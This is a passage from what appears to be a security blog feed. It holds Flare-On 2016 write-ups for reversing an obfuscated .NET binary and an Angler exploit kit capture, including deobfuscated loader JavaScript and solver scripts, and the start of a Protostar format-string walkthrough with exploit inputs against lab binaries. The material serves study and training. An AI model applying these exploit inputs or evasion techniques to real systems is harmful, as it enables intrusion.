  0x6C, 0x66, 0x7F, 0x24, 0x3D, 0xDF, 0x88, 0x97, 0xB9, 0xB3, 
  0xF1, 0xCB, 0x83, 0x99, 0x1A, 0x0D, 0xEF, 0xB1, 0x03, 0x55, 
  0x9E, 0x9A, 0x7A, 0x10, 0xE0, 0x36, 0xE8, 0xD3, 0xE4, 0x32, 
  0xC1, 0x78, 0x07, 0xB7, 0x6B, 0xC7, 0x70, 0xC9, 0x2C, 0xA0, 
  0x91, 0x35, 0x6D, 0xFE, 0x73, 0x5E, 0xF4, 0xA4, 0xD9, 0xDB, 
  0x43, 0x69, 0xF5, 0x8D, 0xEE, 0x44, 0x7D, 0x48, 0xB5, 0xDC, 
  0x4B, 0x02, 0xA1, 0xE3, 0xD2, 0xA6, 0x21, 0x3E, 0x2F, 0xA3, 
  0xD7, 0xBB, 0x84, 0x5A, 0xFB, 0x8F, 0x12, 0x1C, 0x41, 0x28, 
  0xC5, 0x76, 0x59, 0x9C, 0xF7, 0x33, 0x06, 0x27, 0x0A, 0x0B, 
  0xAF, 0x71, 0x16, 0x4A, 0xE9, 0x9F, 0x4F, 0x6F, 0xE2, 0x0F, 
  0xBE, 0x2B, 0xE7, 0x56, 0xD5, 0x53, 0x79, 0x2D, 0x64, 0x17, 
  0x95, 0xA7, 0xBD, 0x7C, 0x1D, 0x58, 0x93, 0xA5, 0x65, 0xF8, 
  0x18, 0x13, 0xEA, 0xBC, 0xE5, 0xF3, 0x37, 0x04, 0x96, 0xA8, 
  0x1E, 0x01, 0x29, 0x82, 0x51, 0x3C, 0x68, 0x1F, 0x8E, 0xDA, 
  0x8A, 0x05, 0x22, 0x72, 0x49, 0xFA, 0x87, 0xA9, 0x54, 0x62, 
  0xC6, 0xAA, 0x09, 0xB4, 0xFD, 0xD6, 0xD1, 0xAC, 0x85, 0x11, 
  0x47, 0x3A, 0x9D, 0xE6, 0x4D, 0x1B, 0xCC, 0x52, 0x80, 0x23, 
  0xFC, 0xED, 0x8B, 0x7E, 0x60, 0xCD, 0x6E, 0x57, 0xBA, 0xDE, 
  0xAE, 0xCA, 0xC4, 0x77, 0x0C, 0x4E, 0xD4, 0xD0, 0xC8, 0xE1, 
  0xB8, 0xF9, 0x26, 0x90, 0x81, 0x34]

def ROL(data, shift, size=8):
    shift %= size
    remains = data &amp;gt;&amp;gt; (size - shift)
    body = (data &amp;lt;&amp;lt; shift) - (remains &amp;lt;&amp;lt; size )
    return (body + remains)

before = []
before.append(target[0] ^ 0xC5)

for i in xrange(1, 0x1A):
    before.append(target[i] ^ target[i - 1])

before.append(0x97)

rflag = &#39;&#39;
for i in reversed(xrange(0x1A)):
    dl = before[i + 1]
    bx = ROL(dl, 3)
    dl = lookup[lookup[bx]]
    ch = dl ^ before[i]
    rflag += chr(ch)

print rflag[::-1]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;retr0_hack1ng@flare-on.com&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&#34;a-name-ch9-a-challenge-9:5c1cd4daab3156a0b511ae43c87fef01&#34;&gt;&lt;a name=&#34;ch9&#34;&gt;&lt;/a&gt;Challenge #9&lt;/h3&gt;

&lt;p&gt;Challenge #9 is a .NET binary named &lt;code&gt;GUI.exe&lt;/code&gt;. Running it gives us:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/2016/11/06/ch9_gui.png&#34; alt=&#34;GUI&#34; /&gt;&lt;/p&gt;

&lt;p&gt;One of the best tools for reversing .NET binaries is &lt;code&gt;dnSpy&lt;/code&gt;. Upon opening the file in dnSpy, we see that the
code has been obfuscated with ConfuserEx 1.0. The button click handler function looks like this:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;private void button1_Click(object sender, EventArgs e)
{
	byte[] buf = Form1.ReadResource(&amp;lt;Module&amp;gt;.\u206F\u202C\u206B\u202E\u200F\u206E\u202E\u206B\u202D\u206D\u200F\u206F\u200F\u200F\u202B\u202C\u200E\u206B\u202C\u202A\u202E\u206D\u206C\u200E\u206C\u206E\u200B\u200F\u206F\u200E\u202A\u206F\u206C\u200B\u206B\u206A\u206B\u202C\u206B\u206E\u202E&amp;lt;string&amp;gt;(282000140u));
	byte[] buffer = this.decryptBuffer(buf);
	byte[] rawAssembly = util.DecompressBuffer(buffer);
	Assembly assembly = Assembly.Load(rawAssembly);
	Type type = assembly.GetType(&amp;lt;Module&amp;gt;.\u202C\u200C\u200F\u202E\u202A\u200E\u202A\u206D\u206F\u200D\u206C\u202C\u200C\u206D\u200C\u206D\u206E\u200E\u200C\u202C\u200F\u206C\u206C\u200D\u200E\u206C\u200D\u202D\u206A\u206E\u200D\u202A\u200B\u206D\u206B\u200D\u206A\u206B\u206E\u206F\u202E&amp;lt;string&amp;gt;(370292149u));
	MethodInfo method = type.GetMethod(&amp;lt;Module&amp;gt;.\u202A\u202C\u206D\u202C\u202A\u206C\u202C\u202B\u206D\u202B\u200F\u202C\u200B\u200F\u206E\u200D\u200C\u202C\u206B\u200E\u200D\u202E\u206C\u206A\u202C\u200F\u200D\u202A\u206C\u202A\u202D\u200B\u200E\u206F\u202B\u206D\u200F\u206E\u202A\u206E\u202E&amp;lt;string&amp;gt;(547307959u));
	bool flag = (bool)method.Invoke(null, new object[]
	{
		&amp;lt;Module&amp;gt;.\u202A\u202C\u206D\u202C\u202A\u206C\u202C\u202B\u206D\u202B\u200F\u202C\u200B\u200F\u206E\u200D\u200C\u202C\u206B\u200E\u200D\u202E\u206C\u206A\u202C\u200F\u200D\u202A\u206C\u202A\u202D\u200B\u200E\u206F\u202B\u206D\u200F\u206E\u202A\u206E\u202E&amp;lt;string&amp;gt;(292816780u)
	});
	if (flag)
	{
		MessageBox.Show(&amp;lt;Module&amp;gt;.\u202D\u202A\u202E\u206C\u202B\u200F\u206B\u202A\u206C\u200D\u200D\u200C\u202B\u206F\u206F\u202C\u206F\u206E\u206D\u206C\u206D\u206F\u206D\u202B\u202C\u200C\u200E\u206B\u200E\u200D\u202C\u206C\u206B\u206E\u200C\u202D\u202E\u200C\u200C\u200C\u202E&amp;lt;string&amp;gt;(3452886671u));
		return;
	}
	MessageBox.Show(&amp;lt;Module&amp;gt;.\u206B\u206A\u200E\u202B\u200E\u202B\u202C\u200F\u202E\u202D\u202B\u200F\u206E\u202B\u206B\u202B\u202A\u206E\u206C\u202B\u202E\u206F\u202C\u200C\u200E\u206A\u202B\u202E\u202D\u200D\u202C\u206E\u202D\u206B\u206D\u206C\u202B\u202D\u206C\u206A\u202E&amp;lt;string&amp;gt;(458656109u));
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I have found a few tools that help with deobfuscating ConfuserEx, namely &lt;code&gt;deDot&lt;/code&gt; and some tools produced by the
members of the tuts4you forum. With the help of these tools, we can deobfuscate the code to something readable:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/2016/11/06/ch9_deob.png&#34; alt=&#34;Deobfucated&#34; /&gt;&lt;/p&gt;

&lt;p&gt;As we can see, the program dynamically decrypts &lt;code&gt;Layer1.dll&lt;/code&gt;, loads the assembly and calls the &lt;code&gt;Start&lt;/code&gt; function. At this
point we can dump the Layer1.dll and deobfuscate it - to make it more readable:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/2016/11/06/ch9_layer1.png&#34; alt=&#34;Layer1&#34; /&gt;&lt;/p&gt;

&lt;p&gt;The code here checks for a debugger with &lt;code&gt;IsDebuggerPresent()&lt;/code&gt; (this one is bypassed with dnSpy by default) and
checks that cpuCount is &amp;gt; 1 (a simple VM check, as most VM&amp;rsquo;s run with 1 virtual CPU). Afterwards, there is
a &lt;code&gt;getKey()&lt;/code&gt; function which enumerates folders in the current directory and looks for a folder named &lt;code&gt;sharing&lt;/code&gt;.
So, we give our VM 2 CPUs and create a &amp;lsquo;sharing&amp;rsquo; folder.&lt;/p&gt;

&lt;p&gt;Now, the programs decrypts and loads &lt;code&gt;Layer2.dll&lt;/code&gt;.
Similarly, Layer2 checks for VM usage with a WMI query &lt;code&gt;select * from win32_videocontroller&lt;/code&gt; (this can be
bypassed with a debugger). Later, the &lt;code&gt;getKey&lt;/code&gt; function looks for the registry key &lt;code&gt;secret&lt;/code&gt; under HKEY_CURRENT_USER.
After creating the key in the registry, we proceed to Layer3.&lt;/p&gt;

&lt;p&gt;Similar to previous checks, this layer checks
for the existence of the user &lt;code&gt;shamir&lt;/code&gt; on the system. After satisfying that check we get a decrypted picture:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/2016/11/06/share6-decoded.png&#34; alt=&#34;Share6&#34; /&gt;&lt;/p&gt;

&lt;p&gt;In addition to the decrypted picture, a &lt;code&gt;ssss-combine.exe&lt;/code&gt; binary gets placed
in the folder where the GUI.exe is running from. This binary is a windows
implementation of the &lt;code&gt;Shamir&#39;s Secret Sharing Scheme&lt;/code&gt;. To get our flag, we
need to combine all 6 shares using ssss-combine.exe. We can dump the first
5 shares from running binary&amp;rsquo;s memory (after successfuly reaching the decoded
picture part) and the 6th one is inside the decoded png.&lt;/p&gt;

&lt;p&gt;Combining all the shares gives us the flag:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/2016/11/06/ch9_shares.png&#34; alt=&#34;Combine&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;Shamir_1s_C0nfused@flare-on.com&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&#34;a-name-ch10-a-challenge-10:5c1cd4daab3156a0b511ae43c87fef01&#34;&gt;&lt;a name=&#34;ch10&#34;&gt;&lt;/a&gt;Challenge #10&lt;/h3&gt;

&lt;p&gt;Unlike the previous challenges, this one is not an executable file. Instead we
are given a pcap file called &lt;code&gt;flava.pcap&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;The interesting part of the pcap is the stream 233 (tcp.stream == 233 in wireshark). It starts with a GET
request to a html page with a bunch of obfuscated javascript:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/2016/11/06/ch10_page.png&#34; alt=&#34;Page&#34; /&gt;&lt;/p&gt;

&lt;p&gt;After cleaning up parts of the code, we can analyze what it does. The end goal of the initial javascript is
to decode and load layer2. The loading happens inside a try/catch block, which suppresses any faulty decoding:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;try {
    if (FiAwn == 1) {
        var U7weQ = new Function(i9mk);
        U7weQ();
        FiAwn = 2
    } 
    else {
        var O0fdFD = new Function(i9mk);
        O0fdFD(i9mk)
    }
} catch (lol) {}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;There are a few checks in the code which prevent a successful decode. The first one is a
&lt;code&gt;ScriptEngineBuildVersion&lt;/code&gt; check and a couple of date checks. After fixing those checks to always return
the correct values, we decode layer2 (partial view):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;function k() {
 String[&#39;prototype&#39;][&#39;kek&#39;] = function(a, b, c, d) {
 var e = &#39;&#39;;
 a = unescape(a);
 for (var f = 0; f &amp;lt; a[&#39;length&#39;]; f++) {
 var g = b ^ a[&#39;charCodeAt&#39;](f);
 e += String[&#39;fromCharCode&#39;](g);
 b = (b * c + d) &amp;amp; 0xFF;
 }
 return e;
 }, String[&#39;prototype&#39;][&#39;&#39;[&#39;kek&#39;](&#39;%0B%5Ei&#39;, 108, 41, 237)] = function() {
 return &#39;&#39;[&#39;kek&#39;](&#39;%C96%E4B%3Ei_%83n%C1%82%FB%DC%01%EAA+o&#39;, 175, 129, 43);
 }, String[&#39;prototype&#39;][&#39;&#39;[&#39;kek&#39;](&#39;6%87%24&#39;, 94, 13, 297)] = function() {
 return &#39;&#39;[&#39;kek&#39;](&#39;4%94%0D%86%7BVXJ%AD%1C%87%0E%FE%C0%DA%D2%20%82%01%ACWAJd%B6%06%8D/&#39;, 92, 33, 31);
 };

 try {
 m();
 var a = l();
 } catch(zzzzz) {}
}

try {
 k();
} catch (z) {}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The end goal of this layer is similar to the first one - to load another decoded javascript. After bypassing a
few checks for Kaspersky products, we decode the 3rd layer (also partial view):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var Il1Ib = Math, Il1Ic = String, Il1IIll1a = JSON, Il1IIll1b = XMLHttpRequest;
var Il1Ie = &#39;&#39;[&#39;lol&#39;](&#39;9%E44%BC%1Ap&#39;, 90, 9, 97),
 Il1If = &#39;&#39;[&#39;&amp;gt;_&amp;lt;&#39;](&#39;%D0%94%18F%A5%C0&#39;, 162, 5, 199),
 Il1Ig = &#39;&#39;[&#39;OGC&#39;](&#39;%B7%5By4%B6%B4w&#39;, 199, 33, 147),
 Il1Ih = &#39;&#39;[&#39;-Q-&#39;](&#39;%B7j%16%9E%04%88%E4%3Ej&#39;, 199, 17, 225),
 Il1I = &#39;&#39;[&#39;&amp;gt;_O&#39;](&#39;%DB%FCy%7D%E1&#39;, 168, 129, 247),
 Il1Ii = &#39;&#39;[&#39;o3o&#39;](&#39;%C4J%13sI%F7%3D&#39;, 173, 5, 195),
 Il1Ij = &#39;&#39;[&#39;Orz&#39;](&#39;%D6%E4zP%20%EC&#39;, 181, 9, 47),
 Il1Ik = &#39;&#39;[&#39;Orz&#39;](&#39;F%92%1C%D5%DF%02&#39;, 52, 65, 191),
 Il1Il = &#39;&#39;[&#39;^_^&#39;](&#39;%3Eq%01%F4%C7G%FB%B7%F34%A2%94&#39;, 88, 65, 171),
 Il1Im = &#39;&#39;[&#39;^_^&#39;](&#39;%DFu%5C_c&#39;, 190, 33, 135),
 Il1In = &#39;&#39;[&#39;lol&#39;](&#39;%FA%5E%1A%F6V%9F&#39;, 150, 5, 77),
 Il1Io = &#39;&#39;[&#39;&amp;gt;_&amp;lt;&#39;](&#39;%F9S%F8%AE%BB%11%89q&#39;, 141, 65, 111),
 Il1Ip = &#39;&#39;[&#39;OGC&#39;](&#39;%03%F7%B7%B7o%A4%06%D49%03&#39;, 96, 9, 63),
 Il1Iq = &#39;&#39;[&#39;O_o&#39;](&#39;%C3%BE%10%C3+&#39;, 165, 129, 173),
 Il1Ir = &#39;&#39;[&#39;lol&#39;](&#39;%D4%1B%E7M&#39;, 167, 33, 235);
var Il1IbbAa = &#39;&#39;[&#39;&amp;gt;_O&#39;](&#39;%10%8D%81%CE%17%A9y9%5B%F0%3Bx%DE%3FC%EB%85%FD%EE%8A%80%FAy%9D%CC%A11%D4KH%23%AF6.%84%5D%28%D8%06dg%24%26%E0%E3%8E0s%A8%1F%B1%10%AF%1B%09%03%E3%02%EBR%5C%A9%13%E5%E3O%3E%BC%E6d%29%C7*3%C1C%A9%FA%13%D2t%B0thY%86O3&#39;, 65, 5, 147);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now, here the interesting function is &lt;code&gt;Il1Iza()&lt;/code&gt; which sends an HTTP POST request that can be seen in the pcap.
A javascript dictionary &lt;code&gt;d&lt;/code&gt; is RC4 encrypted with the key &lt;code&gt;flareon_is_so_cute&lt;/code&gt; and base64 encoded.
The POST request that the code needs to make is seen here:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/2016/11/06/ch10_post.png&#34; alt=&#34;POST&#34; /&gt;&lt;/p&gt;

&lt;p&gt;With that in mind, we can reverse the dictionary value using this python script:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import base64
import binascii

key = &#39;flareon_is_so_cute&#39;

target = &#39;ErZVpc7xaW3bf0h8ythQz62wRdQlMpg3nTEKPYsyE9OtxAU4fCbwYg8zfbxlTnLb3BpLkcSSeuiskPQoEeyrEdZts9jKxSRiiYlr0Q/PDPhri78Sm4vTsUx/ascx7lt0EEvP5YsvQTjW2QvS1+3dyk7x8c8QlQ==&#39;

def rc4(data, key):
    &amp;quot;&amp;quot;&amp;quot;RC4 encryption and decryption method.&amp;quot;&amp;quot;&amp;quot;
    S, j, out = range(256), 0, []

    for i in range(256):
        j = (j + S[i] + ord(key[i % len(key)])) % 256
        S[i], S[j] = S[j], S[i]

    i = j = 0
    for ch in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        out.append(chr(ord(ch) ^ S[(S[i] + S[j]) % 256]))

    return &amp;quot;&amp;quot;.join(out)

target_hex = base64.b64decode(target)
length = len(target_hex)

s = &#39;&#39;
for i in xrange(length):
    for char in xrange(0x20, 0x7f):
        current = s + chr(char)
        if rc4(current, key)[i] == target_hex[i]:
            s += chr(char)
            break

print s
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;root@kali:~# python rc4.py 
{&amp;quot;g&amp;quot;:&amp;quot;91a812d65f3fea132099f2825312edbb&amp;quot;,&amp;quot;A&amp;quot;:&amp;quot;16f2c65920ebeae43aabb5c9af923953&amp;quot;,&amp;quot;p&amp;quot;:&amp;quot;3a3d4c3d7e2a5d4c5c4d5b7e1c5a3c3e&amp;quot;}
root@kali:~#
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Those parameters represent Angler&amp;rsquo;s implementation of the Diffie-Hellman protocol to deliver encrypted shellcode.
The base64 encoded response contains the missing &lt;code&gt;B&lt;/code&gt; parameter, which enables the receiver to calculate the
private key and decode the payload. An excellent analysis of the whole process was done by Kaspersky Labs
in this &lt;a href=&#34;https://securelist.com/blog/research/72097/attacking-diffie-hellman-protocol-implementation-in-the-angler-exploit-kit/&#34;&gt;post&lt;/a&gt;. They provide a Java program which enables us to retrieve the private key that was used.
Plugging in our values into the program (and several hours later) we get:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;... snip ...
[i] Processing 88000001
[i] Processing 89000001
[i] Processing 90000001
[i] Processing 91000001
[i] Processing 92000001
[i] Processing 93000001
[i] Processing 94000001
[13449667480594038]
24c9de545f04e923ac5ec3bcfe82711f
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;With this key we can decode the received payload which contains some javascript and has the key &lt;code&gt;HEAPISMYHOME&lt;/code&gt;
for part2 (flash):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;alert(&amp;quot;Congratz! Wooohooooo, you&#39;ve done it!\n\nGoing thus far, you have already acquired the basic skillset of analyzing EK&#39;s traffic as well as any other web attacks along the way. You should be proud of yourself!\n\nIt is not the end though; it&#39;s only the beginning of our exciting journey!\n\nNow would be a good time to take a breather and grab some beer, coffee, redbull, monster, or water.\n\n\n\nClick &#39;OK&#39; when you&#39;re ready to show us what you&#39;re made of!&amp;quot;);
alert(&amp;quot;Cool, seems like you&#39;re ready to roll!\n\n\n\nThe key for part2 of the challenge is:\n&#39;HEAPISMYHOME&#39;\n\n\n\nYou will need this key to proceed with the flash challenge, which is also included in this pcap.\n\nGood luck! May the force be with you!&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The flash file (which we extracted from the pcap) looks like this:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/2016/11/06/ch10_flash.png&#34; alt=&#34;Flash&#34; /&gt;&lt;/p&gt;

&lt;p&gt;After entering the key a few messages pop up, but nothing visible happens. We decompile the flash code with
the help of JPEXS decompiler. Inside, we find a loader function:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;public function d3cryp7AndL0ad(param1:String) : void
{
	 var _loc2_:Loader = new Loader();
	 var _loc3_:LoaderContext = new LoaderContext(false,ApplicationDomain.currentDomain,null);
	 var _loc4_:Class = Run_challenge1;
	 var _loc5_:ByteArray = pr0udB3lly(ByteArray(new _loc4_()),param1);
	 var _loc6_:String = &amp;quot;1172ca0ede560b08d97b270400347ede&amp;quot;;
	 if(MD5.hashBytes(_loc5_) == _loc6_)
	 {
		this.loaded = true;
		_loc2_.loadBytes(_loc5_);
	 }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This function decodes another flash file and loads it into memory. JPEXS is actually capable of dumping
loaded flash files from memory. Using this functionality we dump the loaded flash file onto disk.
It turns out the dumped SWF is obfuscated with &lt;code&gt;secureSWF&lt;/code&gt;. Loading this file into JPEXS again and
deobfuscating, we get a somewhat readable AS3 code:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;... snip ...
var _loc1_:Object = this.root.loaderInfo.parameters;
if(_loc1_.flare == &amp;quot;On&amp;quot;)
{
	_loc2_ = new Loader();
	_loc3_ = new LoaderContext(false,this.root.loaderInfo.applicationDomain,null);
	this.var_1 = new Array();
	this.var_4 = new ByteArray();
	this.var_39 = _loc1_.x;
	this.var_5 = _loc1_.y;
... snip ...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;From this snippet we can see that this code requires flashvars named &lt;code&gt;flare&lt;/code&gt;, &lt;code&gt;x&lt;/code&gt; and &lt;code&gt;y&lt;/code&gt; passed to it.
The code actually uses the x value as a key to RC4 decode some encoded blobs inside the file and y as
an index to combine and load another SWF from the decoded data.&lt;/p&gt;

&lt;p&gt;Looking closer at the encoded blobs, it seems that two of them are completely unused inside the decryption
routine. One of them has and interesting refercence to imgur - &lt;code&gt;Int3lIns1de_t3stImgurvnUziJP&lt;/code&gt;. It references
an image available at &lt;a href=&#34;http://imgur.com/vnUziJP&#34;&gt;http://imgur.com/vnUziJP&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/2016/11/06/ch10_imgur.png&#34; alt=&#34;Imgur&#34; /&gt;&lt;/p&gt;

&lt;p&gt;So, at this point we have two unused encrypted blobs of data and an image which actually is the decryption of one
of them. Given this and assuming the same RC4 encryption key for both of them, we can actually get the
plain text by XOR-ing all of them together. The result gives us the &lt;code&gt;x&lt;/code&gt; and the &lt;code&gt;y&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;x: 1BR0K3NCRYPT0FTW y: 47:14546,46:1617,35:239,4:47,35:394,3:575,32:4,49:4 ... snip ...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;With these parameters we can load the last decrypted SWF in memory and dump it from there. For some strange reason
I was unable to view the last flash file in JPEXS, so I traced it using &lt;code&gt;Sulo&lt;/code&gt; (pin instrumentation plugin for flash).
Inside the trace we get the decoding of our flag char by char:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;	flash.utils::ByteArray/writeByte ()
		this: 0x3e63c90
		arg 0: 0x61 : int
	Returned: 0x4 : void (call depth: 1)

	flash.utils::ByteArray/writeByte ()
		this: 0x3e63c90
		arg 0: 0x6e : int
	Returned: 0x4 : void (call depth: 1)

	flash.utils::ByteArray/writeByte ()
		this: 0x3e63c90
		arg 0: 0x67 : int
	Returned: 0x4 : void (call depth: 1)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Combining all the &lt;code&gt;arg 0&lt;/code&gt; values, we get the flag:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;angl3rcan7ev3nprim3@flare-on.com&lt;/code&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Protostar Format String (Levels 0-4)</title>
      <link>http://mislusnys.github.io/blog/2016/06/26/protostar-format-string-levels-0-4/</link>
      <pubDate>Sun, 26 Jun 2016 03:10:18 -0400</pubDate>
      
      <guid>http://mislusnys.github.io/blog/2016/06/26/protostar-format-string-levels-0-4/</guid>
      <description>

&lt;p&gt;Protostar is a Linux VM with a series of exploitation exercises. It has five sections: stack overflows, format strings, heap overflows,
network code and 3 final levels with combinations of all the above.&lt;/p&gt;

&lt;p&gt;This post contains solutions for the five format string levels.&lt;/p&gt;

&lt;h3 id=&#34;format0:3b2cdc5fa20dcbff92d76d9edfd44fbc&#34;&gt;Format0&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;This level introduces format strings, and how attacker supplied format strings can modify the execution flow of programs.&lt;/p&gt;

&lt;p&gt;Hints&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;This level should be done in less than 10 bytes of input.&lt;/li&gt;
&lt;li&gt;â€œExploiting format string vulnerabilitiesâ€&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This level is at /opt/protostar/bin/format0&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;source-code:3b2cdc5fa20dcbff92d76d9edfd44fbc&#34;&gt;Source Code&lt;/h4&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

void vuln(char *string)
{
  volatile int target;
  char buffer[64];

  target = 0;

  sprintf(buffer, string);
  
  if(target == 0xdeadbeef) {
      printf(&amp;quot;you have hit the target correctly :)\n&amp;quot;);
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The &lt;code&gt;sprintf&lt;/code&gt; function in the code above has both buffer overflow and format string vulnerabilities.
A standard buffer overflow would look like this (overwriting the target in the process):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ ./format0 `python -c &amp;quot;print &#39;A&#39;*64 + &#39;\xef\xbe\xad\xde&#39;&amp;quot;`
you have hit the target correctly :)
user@protostar:/opt/protostar/bin$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;However, this method uses 68 bytes of input. The 64 &amp;ldquo;A&amp;rdquo;&amp;rsquo;s can be replaced with a format string which has a specific width field &lt;code&gt;%64x&lt;/code&gt;.
Now the exploit looks like this:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ ./format0 `python -c &amp;quot;print &#39;%64x\xef\xbe\xad\xde&#39;&amp;quot;`
you have hit the target correctly :)
user@protostar:/opt/protostar/bin$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This method uses 8 bytes of input.&lt;/p&gt;

&lt;h3 id=&#34;format1:3b2cdc5fa20dcbff92d76d9edfd44fbc&#34;&gt;Format1&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;This level shows how format strings can be used to modify arbitrary memory locations.&lt;/p&gt;

&lt;p&gt;Hints&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;objdump -t is your friend, and your input string lies far up the stack :)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This level is at /opt/protostar/bin/format1&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;source-code-1:3b2cdc5fa20dcbff92d76d9edfd44fbc&#34;&gt;Source Code&lt;/h4&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

int target;

void vuln(char *string)
{
  printf(string);
  
  if(target) {
      printf(&amp;quot;you have modified the target :)\n&amp;quot;);
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In this level we have to overwrite a global variable &lt;code&gt;target&lt;/code&gt; with any value. First we need to find the address of our input on the stack.
We can use a piece of string that is easy to look for (like &amp;ldquo;AAAAAAAA&amp;rdquo;) and dump a piece of the stack with &lt;code&gt;%x&lt;/code&gt; format strings:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ ./format1 `python -c &amp;quot;print &#39;AAAAAAAA&#39; + &#39;%x.&#39;*200&amp;quot;`
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Once we are able to identify our input (41414141) in this hex dump, we can try to adjust the payload to hit a precise possition:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ ./format1 `python -c &amp;quot;print &#39;AAAAAAAA&#39; + &#39;%x.&#39;*128&amp;quot;`
AAAAAAAA804960c.bffff668.8048469.b7fd8304.b7fd7ff4.bffff668.8048435.bffff831.b7ff1040.804845b.b7fd7ff4.8048450.0.bffff6e8.b7eadc76.2.bffff714.bffff720.b7fe1848.bffff6d0.ffffffff.b7ffeff4.804824d.1.bffff6d0.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffff6e8.105f6e4e.3a0bf85e.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffff714.8048450.8048440.b7ff1040.bffff70c.b7fff8f8.2.bffff827.bffff831.0.bffff9ba.bffff9c8.bffff9d3.bffff9f4.bffffa07.bffffa11.bfffff01.bfffff3f.bfffff53.bfffff6a.bfffff7b.bfffff83.bfffff93.bfffffa0.bfffffd4.bfffffe0.0.20.b7fe2414.21.b7fe2000.10.78bf3ff.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.3e9.c.0.d.3e9.e.3e9.17.1.19.bffff80b.1f.bffffff2.f.bffff81b.0.0.0.43000000.c717d6c1.3b98f7d9.5d2de33f.697bf342.363836.0.2e000000.726f662f.3174616d.41414100
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;As we can see our input does not align properly, so we have to pad it a little bit.
We can adjust the payload and stick a single &lt;code&gt;%x&lt;/code&gt; to the end to see if we got it right:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ ./format1 `python -c &amp;quot;print &#39;AAAAAAAA00&#39; + &#39;%x.&#39;*127&amp;quot;`%x
